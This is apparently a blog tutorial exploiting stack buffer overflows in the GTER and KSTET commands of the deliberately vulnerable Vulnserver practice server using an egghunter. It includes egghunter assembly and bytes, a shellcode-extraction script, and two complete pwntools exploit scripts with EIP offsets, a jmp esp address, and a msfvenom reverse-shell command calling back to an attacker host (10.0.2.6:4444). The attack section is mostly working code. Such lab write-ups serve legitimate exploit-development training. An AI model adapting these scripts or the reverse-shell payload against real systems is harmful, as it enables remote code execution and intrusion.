---
title: "Vulnserver: Egghunter in GTER and KSTET after buffer overflow"
date: 2019-11-07
---

In this post we are going to exploit a buffer overflow in both commands, GTER and KSTET, since the exploits are very similar I'm covering them both in the same post. We are going to use a new technique called an egghunter that will allow us to exploit targets that don't give us enough length in the initial payload to put our shellcode.<!--more-->

## Analyzing the crash

### KSTET command
First let's analyze the KSTET command, if we look at the stack after the crash we should notice that there is not much space to work with. We have around 60 bytes before overwriting EIP and only 20 after it, that's clearly not enough for our shellcode that takes more than 300 bytes. 

{{img(id="img/immunitydbg1.PNG" class="textCenter")}}

The first solution that comes to mind is using an egghunter and now you should be asking yourself what's that and the explanation is pretty simple. An egghunter is a very small shellcode that goes through all the memory of the program looking for a tag, 4 bytes of our choosing repeated two times, and once it finds that tag it jumps to the code after it.

Below we can find an egghunter shellcode obtained from a post by Security Sift in the following [link](http://www.securitysift.com/windows-exploit-development-part-5-locating-shellcode-egghunting/). If you want a better explanation of how it works go to that post, a good understanding of x86 Assembly helps a lot to comprehend how it works.

```nasm
entry:
loop_inc_page:
     or    dx, 0x0fff       ; loop through memory pages by adding 4095 decimal or 
                            ; PAGE_SIZE-1 to edx
 
 loop_inc_one:
     inc   edx              ; loop through addresses in the memory page one by one
 
 make_syscall:
     push  edx              ; push edx value (current address) onto the stack to save for 
                            ; future reference
     push  0x43             ; push 0x43 (the Syscall ID for NtDisplayString) onto the stack
     pop   eax              ; pop 0x43 into eax to use as the parameter to syscall
     int   0x2e             ; issue the interrupt to call NtDisplayString kernel function
 
 check_is_valid:
     cmp   al, 0x05         ; compare low order byte of eax to 0x5 (5 = access violation)
     pop   edx              ; restore edx from the stack
     jz    loop_inc_page    ; if the zf flag was set by cmp instruction there was an access 
                            ; violation
                            ; and the address was invalid so jmp back to loop_inc_page
 is_egg:
     mov   eax, 0x444e5750  ; if the address was valid, move the egg into eax for comparison
     mov   edi, edx         ; set edi to the current address pointer in edx for use in the 
                            ; scasd instruction
     scasd                  ; compares value in eax to dword value addressed by edi (current
                            ; address pointer) and sets EFLAGS register accordingly after  
                            ; scasd comparison, EDI is automatically incremented by 4 if DF 
                            ; flag is 0 or decremented if flag is 1 
     jnz   loop_inc_one     ; egg not found? jump back to loop_inc_one
     scasd                  ; first 4 bytes of egg found compare the dword in edi to 
                            ; eax again (remember scasd automatically advanced by 4)
     jnz   loop_inc_one     ; only the first half of the egg was found 
                            ; jump back to loop_inc_one  
 
 found:
     jmp   edi              ;egg found! thanks to scasd, edi now points to shellcode
```

Now that we have our egghunter shellcode we should look for a way to send our reverse shell shellcode into the memory of the program. One possibility is simply sending the shellcode as part of another command, so let's test that with the following python code.

```python
# Important to use different sockets because socket re-use truncated our shellcode
io1 = remote(ip,port)
io1.readline()
io1.sendline(b"KSTAN "+ "GschGsch" + b"A"*350)
io1.close() # Close the socket so we use a different socket for our egghunter
```

To check if it worked we can go to the Memory map window in Immunity Debugger and search for our tag "GschGsch", after trial and error we found that it worked with the KSTAN command giving us more than enough size to put our reverse shell shellcode.

{{img(id="img/immunitydbg2.PNG" class="textCenter")}}

So now we have all the pieces we needed to exploit the KSTET command.

### GTER command

For the GTER command we don't need much more work, if we look at the stack after the crash we see that we have around 150 bytes before overwriting EIP and 20 bytes after. Again that's not enough space for our shellcode so we are going to use the same egghunter technique as in KSTET, the only difference is going to be the offset when overwriting EIP.

{{img(id="img/immunitydbg3.PNG" class="textCenter")}}

So now let's jump into exploiting the commands.

## Exploiting

### KSTET command

First of all we need to generate the shellcode from the assembly of our egghunter, to do that we are going to use the [NASM](https://www.nasm.us/) and a simple python script I created. If we give the name of the file containing the x86 Assembly code to our python script it will print the shellcode. As a note I modified the egghunter code so that it looks for the tag "GschGsch" instead of "PWNDPWND".

```python
import os
import sys
if len(sys.argv) != 2 :
    print "Usage: "+sys.argv[0]+" <file.asm>."
    sys.exit()

cmd = "nasm -fbin -o shellcode.bin " +sys.argv[1]
exit_status = os.system(cmd)
if exit_status != 0:
    print "[!] Error executing nasm."
    sys.exit()

with open("shellcode.bin") as f: 
    code = f.read()
    print '\\x'+'\\x'.join(x.encode('hex') for x in code)

os.remove("shellcode.bin")
```

Now that we have the egghunter shellcode we can see that it's 32 bytes long so we don't have enough space after EIP to put it there. A simply solution is to put a short shellcode that jumps to the 60 bytes we had before our EIP and put our egghunter there. We can use the assembly instruction "jmp -50" or "\xeb\xcc" to do exactly that, if we put it all together we obtain the following script.

```python
from pwn import *

# IP and port of the target (Vulnserver).
ip = "10.0.2.15"
port = 9999

cmd = "KSTET /.:/"
# cyclic -l 0x61616174
offset_eip = 76
eip = 0x625011af # Address of instruction we want to run (jmp esp).

# Here we put the shellcode we want to execute.
offset_sc = offset_eip + 4
shellcode = b"\xeb\xcc" # jmp -50

# Here we put our egghunter (TAG="Gsch").
offset_egg = offset_eip - 50
egg = (b"\x90"*8 + # less padding because stack was overwritting egghunter from below
b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x43\x58\xcd\x2e\x3c\x05\x5a"
b"\x74\xef\xb8\x47\x73\x63\x68\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
b"\xff\xe7")

# Here we add our shellcode and prepend the tag so that egghunter finds it.
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.6 EXITFUNC=thread -f c -b "\x00\x0a"
tag_shellcode = (b"GschGsch" + b"\xdb\xc1\xbe\xd6...")

# Create our payload.
payload = fit({
    0:cmd,
    offset_egg:egg,
    offset_eip:eip,
    offset_sc:shellcode,
    },length=200)

# Important to use different sockets because socket re-use truncated our shellcode
io1 = remote(ip,port)
io1.readline()
io1.sendline(b"KSTAN "+ tag_shellcode)
io1.close()

io = remote(ip,port)
io.readline()
io.sendline(payload)
```

The only thing left is to listen on port 4444 with netcat, execute our script and get our shell. And it works like a charm!

## GTER command

For this commands the steps are exactly the same as for KSTET, we also only have 20 bytes after EIP but we have around 150 bytes before it so we can use a "jmp -100" or "\xeb\x9a" to get to our egghunter. Instead of repeating myself I'm simply going to post how the script looks.

```python
from pwn import *

# IP and port of the target (Vulnserver).
ip = "10.0.2.15"
port = 9999

cmd= b"GTER "
# cyclic -l 0x6261616F
offset_eip = 156 
eip = 0x625011af # Address of instruction we want to run (jmp esp).

# Here we put the shellcode we want to execute.
offset_sc1 = offset_eip + 4
sc1 = b"\xEB\x9A" # jmp -100

# Here we put our egghunter (TAG="Gsch").
offset_egg = offset_eip - 100
egg = (b"\x90"*16 +
b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x43\x58\xcd\x2e\x3c\x05\x5a"
b"\x74\xef\xb8\x47\x73\x63\x68\x89\xd7\xaf\x75\xea\xaf\x75\xe7"
b"\xff\xe7")

# Here we add our shellcode and prepend the tag so that egghunter finds it.
# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.6 EXITFUNC=thread -f c -b "\x00\x0a"
sc2 = (b"GschGsch" + b"\xdb\xc1\xbe\xd6...")

# Create our payload.
payload = fit({
    0:cmd,
    offset_egg:egg,
    offset_eip:eip,
    offset_sc1:sc1,
    },length=200)

# Important to use different sockets because socket re-use truncated our shellcode
io1 = remote(ip,port)
io1.readline()
io1.sendline(b"KSTAN "+ sc2)
io1.close()

io2 = remote(ip,port)
io2.readline()
io2.sendline(payload)
```

And that's it folks, we exploited both commands with almost idential scripts.

See you in the next post :).